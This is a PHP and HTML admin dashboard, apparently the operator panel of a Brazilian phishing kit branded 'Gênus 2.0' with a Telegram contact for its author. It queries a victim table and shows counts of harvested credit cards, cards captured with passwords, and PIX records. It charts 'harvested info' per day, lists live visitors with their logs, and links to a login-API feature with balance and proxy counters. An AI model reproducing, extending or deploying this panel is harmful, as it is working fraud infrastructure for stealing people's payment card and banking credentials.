<?php

require_once ("internal/modulo.php");
require_once ("internal/test_proxy.php");

if (isset($_SESSION ['logged'])) {

$nav_html = file_get_contents ("nav.php");


$dadosLA = "SELECT* FROM analytics";
$conLA = $mysqli->query($dadosLA) or die($mysqli->error);

$array_dias = array ('');
$array_results = array ('');

while ($consultaLA = $conLA->fetch_array()) {
	
	$dia_analise = $consultaLA ['dia'];
	$dia_visitas = $consultaLA ['visitas'];
	$dia_infos = $consultaLA ['infos'];
	$dia_insta = $consultaLA ['dia'];
	$dia_face = $consultaLA ['face'];
	
	
	$min_dia = substr ($dia_analise, 0,2);
	
	array_push($array_dias, $min_dia);
	array_push($array_results, $dia_visitas);
	
	
	
}


$dadosLB = "SELECT* FROM geral where id=1";
$conLB = $mysqli->query($dadosLB) or die($mysqli->error);


while ($consultaLB = $conLB->fetch_array()) {
	
	$geral_visitas = $consultaLB ['visitas'];
	$geral_insta = $consultaLB ['insta'];
	$geral_face = $consultaLB ['face'];
	$geral_bots = $consultaLB ['bots'];
	$geral_extern = $consultaLB ['extern'];
	
	
}




$result_qnt_prod = "SELECT count(id) AS total  FROM dados_cliente where pix=0 ";

$result_now=mysqli_query($mysqli,$result_qnt_prod);
$values_now=mysqli_fetch_assoc($result_now);
$qtd_cc=$values_now['total'];


$result_qnt_pass = "SELECT count(id) AS total  FROM dados_cliente where cc_pass !='null' ";

$result_pass=mysqli_query($mysqli,$result_qnt_pass);
$values_pass=mysqli_fetch_assoc($result_pass);
$qtd_pass=$values_pass['total'];

$result_qnt_pix = "SELECT count(id) AS total  FROM dados_cliente where pix=1 and repete=0 ";

$result_pix=mysqli_query($mysqli,$result_qnt_pix);
$values_pix=mysqli_fetch_assoc($result_pix);
$qtd_pix=$values_pix['total'];


?>

<!DOCTYPE html>
<html lang="en">


<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
	<meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Painel - Admin </title>
    <!-- Favicon icon -->
    <link rel="icon" type="image/png" sizes="16x16" href="images/favicon.png">
	<link href="vendor/owl-carousel/owl.carousel.css" rel="stylesheet">
    <link href="vendor/bootstrap-select/dist/css/bootstrap-select.min.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">
	<link href="../../cdn.lineicons.com/2.0/LineIcons.css" rel="stylesheet">

</head>
<body>

    <!--*******************
        Preloader start
    ********************-->
    <div id="preloader">
        <div class="sk-three-bounce">
            <div class="sk-child sk-bounce1"></div>
            <div class="sk-child sk-bounce2"></div>
            <div class="sk-child sk-bounce3"></div>
        </div>
    </div>
    <!--*******************
        Preloader end
    ********************-->

    <!--**********************************
        Main wrapper start
    ***********************************-->
    <div id="main-wrapper">

        <!--**********************************
            Nav header start
        ***********************************-->
        <div class="nav-header">
            <a href="index.html" class="brand-logo">
                <img class="logo-abbr" src="images/new/genus.png" alt="">
                <img class="logo-compact" src="images/new/genus.png" alt="">
				
			
				
            </a>
			

            <div class="nav-control">
                <div class="hamburger">
                    <span class="line"></span><span class="line"></span><span class="line"></span>
                </div>
            </div>
        </div>
        <!--**********************************
            Nav header end
        ***********************************-->
		
		<!--**********************************
            Chat box start
        ***********************************-->
		<div class="chatbox">
			<div class="chatbox-close"></div>
			<div class="custom-tab-1">
				<ul class="nav nav-tabs">
			
		
					<li class="nav-item">
						<a class="nav-link active" data-toggle="tab" href="#chat">Lista</a>
					</li>
				</ul>
				<div class="tab-content">

					
					
					<div id="list_on_1" style="display: block;" class="tab-pane fade active show" id="chat" role="tabpanel">
						<div class="card mb-sm-3 mb-md-0 contacts_card dz-chat-user-box">
							<div class="card-header chat-list-header text-center">
								<a href="javascript:;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="18px" height="18px" viewBox="0 0 24 24" version="1.1"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><rect fill="#000000" x="4" y="11" width="16" height="2" rx="1"/><rect fill="#000000" opacity="0.3" transform="translate(12.000000, 12.000000) rotate(-270.000000) translate(-12.000000, -12.000000) " x="4" y="11" width="16" height="2" rx="1"/></g></svg></a>
								<div>
									<h6 class="mb-1">Lista de visitantes</h6>
									<p class="mb-0"></p>
								</div>
								<a href="javascript:;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="18px" height="18px" viewBox="0 0 24 24" version="1.1"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><rect x="0" y="0" width="24" height="24"/><circle fill="#000000" cx="5" cy="12" r="2"/><circle fill="#000000" cx="12" cy="12" r="2"/><circle fill="#000000" cx="19" cy="12" r="2"/></g></svg></a>
							</div>
							<div class="card-body contacts_body p-0 dz-scroll  " id="DZ_W_Contacts_Body">
							
								
								
								<ul id="online_list" class="contacts">
									
									<br><br>
									
									<center>
									<img width="50" src="images/new/loader_1.gif"><br>
									Carregando...
									
									</center>

				
									
								</ul>
							</div>
						</div>
						

					
					
					</div>
					
					
					
					<div id="list_on_2" style="display: none;" class="tab-pane fade active show" id="chat" role="tabpanel">

						<div class="card chat dz-chat-history-box">
							<div class="card-header chat-list-header text-center">
								<a href="#" onClick="back_list()" >
									<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="18px" height="18px" viewBox="0 0 24 24" version="1.1"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><polygon points="0 0 24 0 24 24 0 24"></polygon><rect fill="#000000" opacity="0.3" transform="translate(15.000000, 12.000000) scale(-1, 1) rotate(-90.000000) translate(-15.000000, -12.000000) " x="14" y="7" width="2" height="10" rx="1"></rect><path d="M3.7071045,15.7071045 C3.3165802,16.0976288 2.68341522,16.0976288 2.29289093,15.7071045 C1.90236664,15.3165802 1.90236664,14.6834152 2.29289093,14.2928909 L8.29289093,8.29289093 C8.67146987,7.914312 9.28105631,7.90106637 9.67572234,8.26284357 L15.6757223,13.7628436 C16.0828413,14.136036 16.1103443,14.7686034 15.7371519,15.1757223 C15.3639594,15.5828413 14.7313921,15.6103443 14.3242731,15.2371519 L9.03007346,10.3841355 L3.7071045,15.7071045 Z" fill="#000000" fill-rule="nonzero" transform="translate(9.000001, 11.999997) scale(-1, -1) rotate(90.000000) translate(-9.000001, -11.999997) "></path></g></svg>
								</a>
								<div>
									<h6 id="nome_list" class="mb-1">... </h6>
									<p  id="etapa_list" class="mb-0 text-success">...</p>
								</div>							
								<div class="dropdown">
									<a href="javascript:;" data-toggle="dropdown" aria-expanded="false"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="18px" height="18px" viewBox="0 0 24 24" version="1.1"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><rect x="0" y="0" width="24" height="24"></rect><circle fill="#000000" cx="5" cy="12" r="2"></circle><circle fill="#000000" cx="12" cy="12" r="2"></circle><circle fill="#000000" cx="19" cy="12" r="2"></circle></g></svg></a>
									<ul class="dropdown-menu dropdown-menu-right">
										<li class="dropdown-item"><i class="fa fa-user-circle text-primary mr-2"></i> View profile</li>
									</ul>
								</div>
								
	
					
							</div>
							
							<center>
							<br>Logs: <br>
							</center>
							
							
							
							 <div class="card">
							 <div class="card-body">
							 
	
                                        <ul id="add_log" class="list-icons">
										
                                           

                                        </ul>
                                    
                              
							  
							  
                            </div> 
							
							</div>
							
				
						</div>
					</div>

				
				
				
				</div>
			</div>
		</div>
		<!--**********************************
            Chat box End
        ***********************************-->
		
		<!--**********************************
            Header start
        ***********************************-->
        <div class="header">
            <div class="header-content">
                <nav class="navbar navbar-expand">
                    <div class="collapse navbar-collapse justify-content-between">
					<div class="d-none d-md-block" color="red">
					   <h1>𝙈𝙖𝙜𝙖𝙯𝙞𝙣𝙚 𝟮.𝟬 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙖 - 𝙂𝙚̂𝙣𝙪𝙨</h1>
                        </div>
                        <ul class="navbar-nav header-right">
			
		
                            <li hidden=""  class="nav-item dropdown notification_dropdown">
                                <a class="nav-link  ai-icon" href="javascript:;" role="button" data-toggle="dropdown">
                                    <svg width="26" height="26" viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg">
										<path d="M21.75 14.8385V12.0463C21.7471 9.88552 20.9385 7.80353 19.4821 6.20735C18.0258 4.61116 16.0264 3.61555 13.875 3.41516V1.625C13.875 1.39294 13.7828 1.17038 13.6187 1.00628C13.4546 0.842187 13.2321 0.75 13 0.75C12.7679 0.75 12.5454 0.842187 12.3813 1.00628C12.2172 1.17038 12.125 1.39294 12.125 1.625V3.41534C9.97361 3.61572 7.97429 4.61131 6.51794 6.20746C5.06159 7.80361 4.25291 9.88555 4.25 12.0463V14.8383C3.26257 15.0412 2.37529 15.5784 1.73774 16.3593C1.10019 17.1401 0.751339 18.1169 0.75 19.125C0.750764 19.821 1.02757 20.4882 1.51969 20.9803C2.01181 21.4724 2.67904 21.7492 3.375 21.75H8.71346C8.91521 22.738 9.45205 23.6259 10.2331 24.2636C11.0142 24.9013 11.9916 25.2497 13 25.2497C14.0084 25.2497 14.9858 24.9013 15.7669 24.2636C16.548 23.6259 17.0848 22.738 17.2865 21.75H22.625C23.321 21.7492 23.9882 21.4724 24.4803 20.9803C24.9724 20.4882 25.2492 19.821 25.25 19.125C25.2486 18.117 24.8998 17.1402 24.2622 16.3594C23.6247 15.5786 22.7374 15.0414 21.75 14.8385ZM6 12.0463C6.00232 10.2113 6.73226 8.45223 8.02974 7.15474C9.32723 5.85726 11.0863 5.12732 12.9212 5.125H13.0788C14.9137 5.12732 16.6728 5.85726 17.9703 7.15474C19.2677 8.45223 19.9977 10.2113 20 12.0463V14.75H6V12.0463ZM13 23.5C12.4589 23.4983 11.9316 23.3292 11.4905 23.0159C11.0493 22.7026 10.716 22.2604 10.5363 21.75H15.4637C15.284 22.2604 14.9507 22.7026 14.5095 23.0159C14.0684 23.3292 13.5411 23.4983 13 23.5ZM22.625 20H3.375C3.14298 19.9999 2.9205 19.9076 2.75644 19.7436C2.59237 19.5795 2.50014 19.357 2.5 19.125C2.50076 18.429 2.77757 17.7618 3.26969 17.2697C3.76181 16.7776 4.42904 16.5008 5.125 16.5H20.875C21.571 16.5008 22.2382 16.7776 22.7303 17.2697C23.2224 17.7618 23.4992 18.429 23.5 19.125C23.4999 19.357 23.4076 19.5795 23.2436 19.7436C23.0795 19.9076 22.857 19.9999 22.625 20Z" fill="#13B499"/>
									</svg>
									<div class="pulse-css"></div>
                                </a>
                                <div class="dropdown-menu dropdown-menu-right">
                                    <div id="DZ_W_Notification1" class="widget-media dz-scroll p-3 height380">
										<ul class="timeline">
											<li>
												<div class="timeline-panel">
													<div class="media mr-2">
														<img alt="image" width="50" src="images/avatar/1.jpg">
													</div>
													<div class="media-body">
														<h6 class="mb-1">Dr sultads Send you Photo</h6>
														<small class="d-block"></small>
													</div>
												</div>
											</li>

										</ul>
									</div>
                                    <a class="all-notification" href="javascript:;">See all notifications <i class="ti-arrow-right"></i></a>
                                </div>
                            </li>
							<li class="nav-item dropdown notification_dropdown">
                                <a class="nav-link bell bell-link" href="javascript:;">
                          
									<img width="30" src="images/new/lista.png">
						  
						  
									<div class="pulse-css"></div>
                                </a>
							</li>
							

                            <li class="nav-item dropdown header-profile">
                                <a class="nav-link" href="javascript:;" role="button" data-toggle="dropdown">
                                    <img src="images/avatar/default.png" width="20" alt=""/>
									<div class="header-info">
										<span>Admin<i class="fa fa-caret-down ml-3" aria-hidden="true"></i></span>
									</div>
                                </a>
                                <div class="dropdown-menu dropdown-menu-right">
        
                                    <a href="sair.php" class="dropdown-item ai-icon">
                                        <svg id="icon-logout" xmlns="http://www.w3.org/2000/svg" class="text-danger" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg>
                                        <span class="ml-2">Logout </span>
                                    </a>
									
                                </div>
                            </li>
                        </ul>
                    </div>
                </nav>
            </div>
        </div>
        <!--**********************************
            Header end ti-comment-alt
        ***********************************-->

        <!--**********************************
            Sidebar start
        ***********************************-->
        <div class="deznav">
            <div class="deznav-scroll">
			
			
				<ul class="metismenu" id="menu">
				<?php echo $nav_html; ?>


                </ul>
            
				<div class="plus-box">
					<p class="fs-16 font-w500 mb-1">ɪʟɪᴍɪᴛᴀᴅᴏ</p>
				</div>
				<div class="copyright">
					<p class="fs-14 font-w200"><strong class="font-w400">Full</strong> © 2023 </p>
					<p> <i class="fa fa-heart text-danger"></i> Gênus 2.0 | @DuMalote</p>
					MEU TELEGRAM <a target="_blank" href="https://t.me/dumalote"><font color="7266ff">TELEGRAM</font></a>
				</div>
			</div>
        </div>
        <!--**********************************
            Sidebar end
        ***********************************-->
		
		<!--**********************************
            Content body start
        ***********************************-->
        <div class="content-body">
            <!-- row -->
			<div class="container-fluid">
				<div class="row">



					
					
					
					
					
					<div class="col-xl-6 col-xxl-7 col-lg-6">
					
												<div class="col-xl-12">
								<div class="card">
									<div class="card-header border-0 pb-0">
										<h4 class="fs-20 mb-0">Visitantes</h4>
							
									</div>
									<div class="card-body">
									
										<div class="d-flex justify-content-between align-items-center bg-dark p-3 rounded">	
											<span class="text-white fs-14">Visitas</span>
											<span class="text-white fs-14"><?php echo $geral_visitas ?></span>
										</div>
										<br>
										<div class="d-flex justify-content-between align-items-center bg-dark p-3 rounded">	
											<span class="text-white fs-14">Online</span>
											<span id="online_now" class="text-white fs-14"><img width="20" src="images/new/list.gif"></span>
										</div>
										
										
										<div class="row">
											<div class="col-md-6">
											
												<div class="selling-pie-chart">
												
												<center>
													<canvas id="pie_chart"></canvas>
												</center>
												
												
												</div>	
												
												
												<div class="chart-point mt-4 text-center">
													<div class="fs-13 col px-0">
														<span class="a mx-auto"></span>
														Facebook
													</div>
													<div class="fs-13 col px-0">
														<span class="b mx-auto"></span>
														Instagram
													</div>
													<div class="fs-13 col px-0">
														<span class="c mx-auto"></span>
														Bots
													</div>
												</div>
											</div>
											<div class="col-md-6">
												<div id="lineChart"></div>
											</div>
										</div>
									</div>
								</div>
							</div></div>
					
					

					
					
					
					
					
					
					
										<div class="col-xl-6 col-xxl-7 col-lg-6">
						<div class="row">
						
						
					<div class="col-sm-6">
						<div class="card">
							<div class="social-graph-wrapper bg-danger">
								<span class="s-icon"><i class="fa fa-credit-card"></i></span>
							</div>
							<div class="row">
								<div class="col-6 border-right">
									<div class="pt-3 pb-3 pl-0 pr-0 text-center">
										<h4 class="m-1"><span class="counter"><?php echo $qtd_cc ?></span> cc</h4>
										<p class="m-0">(<font color="#ed0b4c"><?php echo $qtd_pass ?></font>)<small> com senha</small></p>
									</div>
								</div>
								<div class="col-6">
									<div class="pt-3 pb-3 pl-0 pr-0 text-center">
										<h4 class="m-1"><span class="counter"><?php echo $qtd_pix ?></span></h4>
										<p class="m-0">PIX</p>
									</div>
								</div>
							</div>
						</div>
					</div>
					
					<div class="col-sm-6">
						<div class="card">
							<div class="social-graph-wrapper  bg-danger">
								<span class="s-icon"><i class="fa fa-lock"></i></span>
							</div>
							<div class="row">
			
							<?php if ($api_login_status == 1) { ?>
								<div class="col-6 border-right">
									<div class="pt-3 pb-3 pl-0 pr-0 text-center">
										<h4 class="m-1"><span class="counter"><?php echo $saldo ?></span></h4>
										<p class="m-0">Saldo</p>
									</div>
								</div>
								
								<div class="col-6">
									<div class="pt-3 pb-3 pl-0 pr-0 text-center">
										<h4 class="m-1"><span class="counter"><?php echo $proxy ?></span></h4>
										<p class="m-0">Proxy</p>
									</div>
								</div>
							<?php } else { ?>
		
		
		
								<div class="col-12">
									<div class="pt-3 pb-3 pl-0 pr-0 text-center">
										<p class="m-0"><small>Ative a <a href="api_login.php"><strong>API de Login</strong></a> para melhorar seus resultados.</small></p>
									</div>
								</div>
		
		
							<?php } ?>
							
					
								
								
								
							</div>
						</div>
					</div>

						

							
							
					<div class="col-sm-12">
                        <div class="card">
                            <div class="card-header border-0 pb-0">
                                <h4 class="card-title">Avisos</h4>
                            </div>
                            <div class="card-body">
                                <div id="DZ_W_TimeLine1" class="widget-timeline dz-scroll style-1 height250">
                                    <ul id="avisos" class="timeline"></ul>
                                </div>
                            </div>
                        </div>
					</div>
							
							
							
							
							
							
						</div>
					</div>













					<script>
					
						var pieChart = function(){
		//pie chart
		if(jQuery('#pie_chart').length > 0 ){
			//pie chart
			const pie_chart = document.getElementById("pie_chart").getContext('2d');
			//pie_chart.height = 100;
			new Chart(pie_chart, {
				type: 'pie',
				data: {
					defaultFontFamily: 'Poppins',
					datasets: [{
						
						
						data: [<?php echo $geral_face ?>, <?php echo $geral_insta ?>, <?php echo $geral_bots ?>, <?php echo $geral_extern ?>],
						
						borderWidth: 0, 
						
						backgroundColor: [
							"rgba(237, 11, 76)",
							"rgba(237, 11, 76)",
							"rgba(237, 11, 76)",
							"rgba(0,0,0,0.07)"
						],
						hoverBackgroundColor: [
							"rgba(237, 11, 76)",
							"rgba(237, 11, 76)",
							"rgba(237, 11, 76)",
							"rgba(0,0,0,0.07)"
						]

					}],
					labels: [
						"Facebook",
						"Instagram",
						"Bots", 
						"Desconhecido"
					]
				},
				options: {
					responsive: true, 
					legend: false, 
					maintainAspectRatio: false
				}
			});
		}
	}
					
					
					var lineChart = function(){
		var optionsTimeline = {
			chart: {
				type: "bar",
				height: 350,
				stacked: true,
				toolbar: {
					show: false
				},
				sparkline: {
					//enabled: true
				},
				offsetX: 0,
			},
			series: [
				 {
					name: "Infos Colhidas",
					data: [<?php echo $array_results[1]; ?>, <?php echo $array_results[2]; ?>, <?php echo $array_results[3]; ?>, <?php echo $array_results[4]; ?>, <?php echo $array_results[5]; ?>, <?php echo $array_results[6]; ?>, <?php echo $array_results[7]; ?>]
				}
				
			],
			
			plotOptions: {
				bar: {
					columnWidth: "25%",
					endingShape: "rounded",
					startingShape: "rounded",
					
					colors: {
						backgroundBarColors: ['#3B444D', '#3B444D', '#3B444D', '#3B444D','#3B444D','#3B444D','#3B444D','#3B444D'],
						backgroundBarOpacity: 1,
						backgroundBarRadius: 5,
					},

				},
				distributed: true
			},
			colors:['#ed0b4c'],
			grid: {
				borderColor:'#323940'
			},
			legend: {
				show: false
			},
			fill: {
			  opacity: 1
			},
			dataLabels: {
				enabled: false,
				colors: ['#000'],
				dropShadow: {
				  enabled: true,
				  top: 1,
				  left: 1,
				  blur: 1,
				  opacity: 1
			  }
			},
			xaxis: {
			 categories: [<?php echo $array_dias[1]; ?>, <?php echo $array_dias[2]; ?>, <?php echo $array_dias[3]; ?>, <?php echo $array_dias[4]; ?>, <?php echo $array_dias[5]; ?>, <?php echo $array_dias[6]; ?>, <?php echo $array_dias[7]; ?>],
			  labels: {
			   style: {
				  colors: '#787878',
				  fontSize: '13px',
				  fontFamily: 'poppins',
				  fontWeight: 100,
				  cssClass: 'apexcharts-xaxis-label',
				},
			  },
			  crosshairs: {
				show: false,
			  },
			  axisBorder: {
				  show: false,
				},
			},
			
			yaxis: {
				show: false
			},
			
			tooltip: {
				x: {
					show: true
				}
			}
		};
		var chartTimelineRender =  new ApexCharts(document.querySelector("#lineChart"), optionsTimeline);
		 chartTimelineRender.render();	
	}	
					
					
						 var doughnutChart = function(){
		if(jQuery('#doughnut_chart').length > 0 ){
			//doughut chart
			const doughnut_chart = document.getElementById("doughnut_chart").getContext('2d');
			// doughnut_chart.height = 100;
			new Chart(doughnut_chart, {
				type: 'doughnut',
				data: {
					weight: 5,	
					defaultFontFamily: 'Poppins',
					datasets: [{
						data: [35, 25, 25,15, 20],
						borderWidth: 5, 
						borderColor: "rgba(47,54,61,1)",
						backgroundColor: [
							
						],
						hoverBackgroundColor: [
							
						]

					}],
					// labels: [
					//     "green",
					//     "green",
					//     "green",
					//     "green"
					// ]
				},
				options: {
					weight: 1,	
					 cutoutPercentage: 60,
					responsive: true,
					maintainAspectRatio: false
				}
			});
		}
	}
					
					
					</script>
					
					
					



















				</div>
            </div>
        </div>
        <!--**********************************
            Content body end
        ***********************************-->

        <!--**********************************
            Footer start
        ***********************************-->
        <div class="footer">
            <div class="copyright">
                <p>Copyright © Designed &amp; Developed by <a href="https://api.whatsapp.com/send?phone=551998485812" target="_blank">Dumalote</a> 2023</p>
            </div>
        </div>
        <!--**********************************
            Footer end
        ***********************************-->

		<!--**********************************
           Support ticket button start
        ***********************************-->

        <!--**********************************
           Support ticket button end
        ***********************************-->


    </div>
    <!--**********************************
        Main wrapper end
    ***********************************-->

    <!--**********************************
        Scripts
    ***********************************-->
    <!-- Required vendors -->
    <script src="vendor/global/global.min.js"></script>
	<script src="vendor/bootstrap-select/dist/js/bootstrap-select.min.js"></script>
    <script src="js/custom.min.js"></script>
	<script src="vendor/chart.js/Chart.bundle.min.js"></script>
	<script src="js/deznav-init.js"></script>
	<script src="vendor/owl-carousel/owl.carousel.js"></script>
	
	<!-- Apex Chart -->
	<script src="vendor/apexchart/apexchart.js"></script>
	<!-- Dashboard 1 -->
	<script src="js/dashboard/dashboard-1.js"></script>
	    <script src="js/plugins-init/chartjs-init.js"></script>

	
		<script src="js/jquery-3.2.1.min.js"></script>
	<script src="js/play.js"></script>
	
</body>

<!-- Mirrored from karciz.dexignzone.com/xhtml/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 13 Sep 2021 18:35:36 GMT -->
</html>

<?php } else { header ('Location: login.php'); }?>